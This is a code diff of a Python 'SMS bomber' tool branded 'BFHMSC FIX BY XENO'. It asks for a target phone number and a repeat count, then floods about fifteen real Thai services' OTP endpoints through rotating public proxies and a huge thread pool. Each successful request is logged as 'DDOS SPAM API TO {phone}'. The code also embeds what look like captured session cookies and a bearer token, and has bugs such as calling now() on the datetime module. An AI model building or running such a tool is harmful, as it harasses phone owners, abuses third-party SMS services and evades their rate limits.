@@ -2,22 +2,23 @@ import datetime
 import itertools
 import os
 import random
-import requests
 import threading
+import time
 from concurrent.futures import ThreadPoolExecutor
-from rich.console import Console
-from rich.prompt import Prompt
-from rich import print as rprint
+from re import search
 
-# Clear the terminal and set the title
-os.system("cls & title BFHMSC FIX BY XENO")
-
-# Initialize a console for Rich printing
-console = Console()
-
+import gratient
+import requests
+from httpx import get
+from pystyle import Anime, Center, Colorate, Colors, System, Write
+from requests import Session, get
+from user_agent import generate_user_agent
+os .system ("cls & title BFHMSC FIX BY XENO")
 def now():
-    return datetime.datetime.now().strftime("%H:%M:%S")
-
+    now = datetime.now()
+    nownow = now.strftime("%H:%M:%S")
+    return nownow
+os .system ("BFHMSC SMS FIX BY Xeno")
 banner = r"""
 ██╗  ██╗███████╗███╗   ██╗
 ╚██╗██╔╝██╔════╝████╗  ██║
@@ -29,86 +30,205 @@ banner = r"""
 ║     BFHMSC FIX BY Xeno   ║
 ║     linktr.ee/Xeno_miss  ║
 ╚══════════════════════════╝
+[+] Enter
 """
 
-# Print the banner
-console.print(banner)
+def rb(text):
+        return (Colorate.Horizontal(Colors.rainbow,text))
 
-# Cycle through colors for console output
-colorsPool = itertools.cycle([i for i in range(256)])
+System.Size(120, 30) 
 
-def printx(text):
-    color = next(colorsPool)
-    console.print(f'[\x1b[38;5;{color}m{now()}\x1b[0m] {text}')
+Anime.Fade(Center.Center(banner), Colors.blue_to_cyan, Colorate.Vertical, enter=True)
 
-# ThreadPool for concurrent requests
-thread_pool = ThreadPoolExecutor(max_workers=100)
 
-# Fetch proxies and store them in a list
-proxy_url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
-proxies = requests.get(proxy_url).text.splitlines()
+colorsPool = itertools.cycle([27, 33, 69, 74, 74, 73, 73, 73, 78, 114, 114, 113, 113, 155, 155, 155, 155, 155, 155, 191, 191, 185, 185, 185, 185, 185, 185, 221, 221, 221, 221, 221, 215, 215, 215, 209, 209, 209, 203, 203, 203, 204, 204, 204, 198, 198, 129, 129, 135, 99, 99, 99, 99, 63, 63, 63, 63, 69, 69, 69])
+def printx(input):print('[\x1b[38;5;%sm%s\x1b[0m] %s' % (next(colorsPool), datetime.datetime.now().strftime('%H:%M:%S'), input))
 
-def bfhmsc():
-    phone = Prompt.ask("[+] Phone: ", default="")
+threading = ThreadPoolExecutor(max_workers=int(100000000))
+headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
+header = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
+headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
+useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"      
+proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
+f = open("proxy.txt", "w")
+t = f.write(proxy)
+g = open("proxy.txt", "r")
+s = g.read().splitlines()
 
-    # Validate phone number length
-    if not (len(phone) == 9):  # Assuming phone number is 9 digits
-        console.print('[ERROR] PHONE NUMBER ERROR [ ! ]', style='bold red')
-        return
+os .system ("cls & title BFHMSC FIX BY XENO")
+def now():
+    now = datetime.now()
+    nownow = now.strftime("%H:%M:%S")
+    return nownow
 
-    amount = Prompt.ask("\n[+] Time: ", default="")
-    
-    try:
-        amount = int(amount)
-        for _ in range(amount):
-            bfhmscapi(phone)
-    except ValueError:
-        console.print('[ERROR] Invalid input for time.', style='bold red')
 
-def send_request(api_url, phone, data=None, json=None):
-    try:
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
-        }
-        proxies = {'http': 'http://' + random.choice(proxies)}
+format_one = 0
+format_two = 0
+format_tre = 0
 
-        if json:
-            r = requests.post(api_url, json=json, headers=headers, proxies=proxies)
-        else:
-            r = requests.post(api_url, data=data, headers=headers, proxies=proxies)
+loop_types = 1
 
-        if r.status_code in [200, 201]:
-            printx(f"DDOS SPAM API TO {phone} SUCCESS")
-        else:
-            printx(f"Failed to send to {phone}. Status Code: {r.status_code}")
+def receive_color():
+    global format_one, format_two, format_tre, loop_types
 
-    except Exception as e:
-        printx(f"An error occurred: {str(e)}")
+    for types1, types2, types3, number in zip([1, 0], [0, 1], ['+', '-'], [255, 0]):
+        if (loop_types == types1):
+            if (format_one != number):
+                exec(f'format_one {types3}= 15', globals())
 
-def bfhmscapi(phone):
-    api_endpoints = [
-        ("https://store.truecorp.co.th/api/true/wportal/otp/request", {"mobile_number": phone}),
-        ("https://openapi.bigc.co.th/customer/v1/otp", {"phone_no": phone}),
-        ("https://lb-api.fox83-sy.xyz/api/otp/register", {"applicant": phone, "serviceName": "fox888.com"}),
-        ("https://topping.truemoveh.com/api/get_request_otp", f"mobile_number={phone}"),
-        ("https://api2.1112.com/api/v1/otp/create", {"phonenumber": phone, "language": "th"}),
-        ("https://api-sso.ch3plus.com/user/request-otp", {"tel": phone, "type": "login"}),
-        ("https://www.vegas77slots.com/auth/send_otp", f"phone={phone}"),
-        ("https://service-api.auto1.co.th/w/user/request-otp-on-register", {"Tel": phone}),
-        ("https://cognito-idp.ap-southeast-1.amazonaws.com/", {"ClientId": "6g47av6ddfcvi06v4l186c16d6", "Username": f"+66{phone[1:]}"}),
-        ("https://kamuishop.online/kamuiapi/phone/", None),
-        ("https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[1:]}", None),
-        ("https://app.iship.cloud/api/ant/request-otp/{phone}", None),
-        ("https://m-api.hhh-st1.xyz/api/otp/register", {"applicant": phone, "serviceName": "hihuay.com"}),
-        ("https://www.beauticool.com/?m=request_otp", f"tel={phone}")
-    ]
+            if (format_one == number) and (format_two != number):
+                exec(f'format_two {types3}= 15', globals())
 
-    for api_url, data in api_endpoints:
-        send_request(api_url, phone, data=data if isinstance(data, str) else None, json=data if isinstance(data, dict) else None)
+            if (format_two == number) and (format_tre != number):
+                exec(f'format_tre {types3}= 15', globals())
 
-if __name__ == "__main__":
-    bfhmsc()
+            if (format_tre == number):
+                loop_types = types2
 
+    return f"\033[38;2;{format_one};{format_two};{format_tre}m"
+
+def BFHMSC():
+	print(gratient.blue("""
+██╗  ██╗███████╗███╗   ██╗
+╚██╗██╔╝██╔════╝████╗  ██║
+ ╚███╔╝ █████╗  ██╔██╗ ██║
+ ██╔██╗ ██╔══╝  ██║╚██╗██║
+██╔╝ ██╗███████╗██║ ╚████║
+╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
+╔══════════════════════════╗
+║     BFHMSC FIX BY Xeno   ║
+║     linktr.ee/Xeno_miss  ║
+╚══════════════════════════╝
+	"""))
+
+	
+	
+	
+	
+	phone = Write.Input("[+] Phone: ", Colors.blue_to_purple, interval=0.01)
+	if int(phone) <= 99999999 or int(phone) >= 999999999:
+		print()
+		print('\x1b[92m[ ERROR ]\x1b[00m : \x1b[91mPHONE NUMBER ERROR [ ! ] \x1b[00m')
+		time.sleep(1)
+		os.system('clear')
+	else:
+		phone = phone
+		amount = int(Write.Input("\n  [+] Time: ", Colors.light_blue, interval=0.01))
+		amount = amount
+		print()
+		print()
+		BFHMSCAPI(phone, amount)
+		
+		
+def bfhmscapi1(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}",proxies={'http': 'http://' + random.choice(s)})
+	if r.status_code == 200 or r.status_code == 201:
+		printx(f"DDOS SPAM API TO {phone} SUCSESS")
+
+def bfhmscapi2(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.post("https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no":f"{phone}"},proxies={'http': 'http://' + random.choice(s)})
+	if r.status_code == 200 or r.status_code == 201:
+		printx(f"DDOS SPAM API TO {phone} SUCSESS")
+
+def bfhmscapi3(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.post("https://lb-api.fox83-sy.xyz/api/otp/register",data={"applicant":phone,"serviceName":"fox888.com"},proxies={'http': 'http://' + random.choice(s)})
+	if r.status_code == 200 or r.status_code == 201:
+		printx(f"DDOS SPAM API TO {phone} SUCSESS")
+
+def bfhmscapi4(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}",headers={
+    "Accept": "application/json, text/plain, /",
+    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
+    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"},proxies={'http': 'http://' + random.choice(s)})
+	if r.status_code == 200 or r.status_code == 201:
+		printx(f"DDOS SPAM API TO {phone} SUCSESS")
+
+def bfhmscapi5(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
+	    "language": "th"},headers={"accept": "application/json, text/plain, /",
+	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
+	if r.status_code == 200 or r.status_code == 201:
+		print(receive_color() + f'[{now()}] {phone} FAST SLEEP')
+
+def bfhmscapi6(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel":f"{phone}","type":"login"},proxies={'http': 'http://' + random.choice(s)})
+	if r.status_code == 200 or r.status_code == 201:
+		printx(f"DDOS SPAM API TO {phone} SUCSESS")
+
+def bfhmscapi7(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"},proxies={'http': 'http://' + random.choice(s)})
+	if r.status_code == 200 or r.status_code == 201:
+		printx(f"DDOS SPAM API TO {phone} SUCSESS")
+
+def bfhmscapi8(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.post("https://service-api.auto1.co.th/w/user/request-otp-on-register",json={"ConsentFlag":"true","AcceptPolicy":"true","Tel":phone,"OTPId":"","OTP1":"","OTP2":"","OTP3":"","OTP4":"","OTP5":"","OTP6":"","Email":"","Pin1":"","Pin2":"","Pin3":"","Pin4":"","Pin5":"","Pin6":"","PinConfirm1":"","PinConfirm2":"","PinConfirm3":"","PinConfirm4":"","PinConfirm5":"","PinConfirm6":"","FirstName":"","LastName":""},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
+	if r.status_code == 200 or r.status_code == 201:
+		printx(f"DDOS SPAM API TO {phone} SUCSESS")
+	
+def bfhmscapi9(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"},proxies={'http': 'http://' + random.choice(s)})
+	if r.status_code == 200 or r.status_code == 201:
+		printx(f"DDOS SPAM API TO {phone} SUCSESS")
+
+def bfhmscapi10(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.get(f"https://kamuishop.online/kamuiapi/phone/{phone}")
+	if r.status_code == 200 or r.status_code == 201:
+		printx(f"DDOS SPAM API TO {phone} SUCSESS")
+def bfhmscapi11(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{phone[1:]}&phoneCountryCode=%2B66&b-uid=1.0.760",headers={"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..MSrqMX5S5Ui8NbGvEih2uw.NCJuqSPHzIwZ0Jy4Snq25pKUa887meHakzTe3YTCUnVsMwY8cQMnJ-nOr6Lbb5irc2gr8VfD0G2ZYocg22oVH36DdBnfoJirezzLuf9Uc2DiaQHLJ8OJY3UHo8fLUMB7BYe2w0Q5fDdMF1N0u8_aGA.ZNn49ubbJXSlycijnTncbQ"},proxies={'http': 'http://' + random.choice(s)})
+	if r.status_code == 200 or r.status_code == 201:
+		printx(f"DDOS SPAM API TO {phone} SUCSESS")
+
+def bfhmscapi12(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "_fbp=fb.1.1664699330289.47112595; XSRF-TOKEN=eyJpdiI6Ijk3cVRMUndzZ2FUME8wV2VzRXFaWWc9PSIsInZhbHVlIjoiQjRkNzlNYXR2TWtSWmNySlFYVjBoQk80RGJMR215RXVFUjRuMTFNYm5ocGRDRmNGcHNjWmpOeUdnOWlPbmFhVXA5eG1LUlB2SVZEMjRFWEVITTRZV1hzZUtZenArenZjK0R3UE5OTUdTQkVWUG1tYmkrTG1NWWFiTUZOZ1NRMlIiLCJtYWMiOiI3Y2M1OGJkMzg2MzZkZDYwNjlmNjNkMmFkYWZlZDVkNjliZGJjMjUwN2MyMjJmYzgxODE3ZGYxOWY1NWU4MzhlIiwidGFnIjoiIn0%3D; iship_session=eyJpdiI6IjdueEZQTU5Kc0FXZ0hjeVF0L2s2WVE9PSIsInZhbHVlIjoidHNzZ1RINDhta1BnUkFic29hdFlMNU8zVWt0MGZYbUVMb1Q0ZjM0OVR5cFlSbE01NlNuMWRoeGF4SldiVHN3U3JFZWg5dnJvMEZHbnF6cnlNdG45SmZjSGxqRkNRN0w0T3oyclBHc09ZM2svd3VZZkl4TG9NRHFLMTIxeGhvd2oiLCJtYWMiOiJhMTBjZThjNGU5M2Y0NjM1MTQ4ZTI4MGFmMzkxMmQ4ZmY0NjljNGM5YjBkZWZkMGIxYTM5Y2Y5MDgyNWZkOTk1IiwidGFnIjoiIn0%3D; _gcl_au=1.1.1744992984.1664699333; _ga_5H8RG35JM3=GS1.1.1664699330.1.1.1664699332.0.0.0; _gid=GA1.2.1851918371.1664699333; _gat_UA-208577766-1=1; _ga=GA1.1.1543229521.1664699330; _ga_9QF6J7SNMX=GS1.1.1664699332.1.0.1664699332.0.0.0"},proxies={'http': 'http://' + random.choice(s)})
+	if r.status_code == 200 or r.status_code == 201:
+		printx(f"DDOS SPAM API TO {phone} SUCSESS")
+
+def bfhmscapi13(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.post("https://m-api.hhh-st1.xyz/api/otp/register",headers={"content-type": "application/json","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"applicant":phone,"serviceName":"hihuay.com"})
+	if r.status_code == 200 or r.status_code == 201:
+		printx(f"DDOS SPAM API TO {phone} SUCSESS")
+def bfhmscapi14(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.post("https://www.beauticool.com/?m=request_otp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "PHPSESSID=rhq2hpsfsr3u3ji2pie67j99u0;_ga=GA1.1.1106451021.1666928426;trustedsite_visit=1;loadapp=true;_ga_PZZ327LRJ2=GS1.1.1666928426.1.1.1666928451.0.0.0","x-requested-with": "XMLHttpRequest"},data=f"tel={phone}",proxies={'http': 'http://' + random.choice(s)})
+	if r.status_code == 200 or r.status_code == 201:
+		printx(f"DDOS SPAM API TO {phone} SUCSESS")
+
+def bfhmscapi15(phone):
+	da = datetime.datetime.now()
+	ok = da.strftime("%H:%M:%S")
+	r = requests.put(f"https://www.xn--24-3qi4duc3a1a7o.net/api/common/otp/request/{phone}",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"method":"register"},proxies={'http': 'http://' + random.choice(s)})
+	if r.status_code == 200 or r.status_code == 201:
+		printx(f"DDOS SPAM API TO {phone} SUCSESS")
 
 def bfhmscapi16(phone):
 	da = datetime.datetime.now()
